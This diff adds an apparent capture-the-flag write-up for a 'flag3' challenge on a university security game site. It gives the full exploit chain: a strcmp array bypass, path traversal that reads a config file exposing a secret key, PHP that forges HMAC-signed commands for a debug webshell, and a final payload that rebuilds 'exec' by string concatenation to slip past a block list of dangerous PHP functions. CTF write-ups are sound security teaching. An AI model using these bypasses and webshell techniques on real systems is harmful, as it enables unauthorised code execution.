@@ -1,0 +1,62 @@
+https://game1.security.ntu.st/flag3/
+"Get a webshell first!"
+
+watch the source of this website
+found someting in core/fun_debug.php
+
+"if (strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")) {"
+=> let dir be an array will pass this check
+
+need $GLOBALS["secret_key"] to make_command
+
+https://game1.security.ntu.st/index.php?action=edit&item=../.config/conf.php&order=name&srt=yes
+
+$GLOBALS["secret_key"] = 'KHomg4WfVeJNj9q5HFcWr5kjawiejfghojiojw6pQQyzmIZuRBbwDU7UE6jYjPm3';
+
+got webshell => https://game1.security.ntu.st/index.php?action=debug&dir[]=&command=
+
+write command
+<?php
+function make_command($cmd) {
+    $hmac = hash_hmac('sha256', $cmd, 'KHomg4WfVeJNj9q5HFcWr5kjawiejfghojiojw6pQQyzmIZuRBbwDU7UE6jYjPm3');
+    return sprintf('%s.%s', base64_encode($cmd), $hmac);
+}
+echo urlencode(make_command('phpinfo();'))."\n";
+?>
+
+get the phpinfo();
+
+<?php
+function make_command($cmd) {
+    $hmac = hash_hmac('sha256', $cmd, 'KHomg4WfVeJNj9q5HFcWr5kjawiejfghojiojw6pQQyzmIZuRBbwDU7UE6jYjPm3');
+    return sprintf('%s.%s', base64_encode($cmd), $hmac);
+}
+echo urlencode(make_command('chmod("flag3/flag3", 0755);function dirToArray($dir,$pre) {$result = array();$cdir = scandir($dir);foreach ($cdir as $key => $value){if (!in_array($value,array(".",".."))){if (is_dir($dir . DIRECTORY_SEPARATOR . $value)){ $result[$value] = dirToArray($dir . DIRECTORY_SEPARATOR . $value);}else{$result[] = $value." _".@decoct(@fileperms($dir."/".$value) & 0777)." _".@fileowner($dir."/".$value);}}}return $result;} print_r(dirToArray("."));'))."\n";
+?>
+
+get the map of this website
+
+[flag3] => Array
+        (
+            [0] => Makefile _644 _0
+            [1] => flag3 _400 _1001
+            [2] => index.html _644 _0
+            [3] => meow _711 _1001
+            [4] => meow.c _644 _0
+        )
+
+https://game1.security.ntu.st/index.php?action=edit&item=../flag3/Makefile&order=name&srt=yes
+https://game1.security.ntu.st/index.php?action=edit&item=../flag3/meow.c&order=name&srt=yes
+
+write a command without 'system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl'
+
+read https://phpaudit.books.isecer.com/2.4.html
+
+final command
+<?php
+function make_command($cmd) {
+    $hmac = hash_hmac('sha256', $cmd, 'KHomg4WfVeJNj9q5HFcWr5kjawiejfghojiojw6pQQyzmIZuRBbwDU7UE6jYjPm3');
+    return sprintf('%s.%s', base64_encode($cmd), $hmac);
+}
+echo urlencode(make_command('$comd="exe"."c";echo $comd("flag3/meow flag3/flag3");'));
+?>
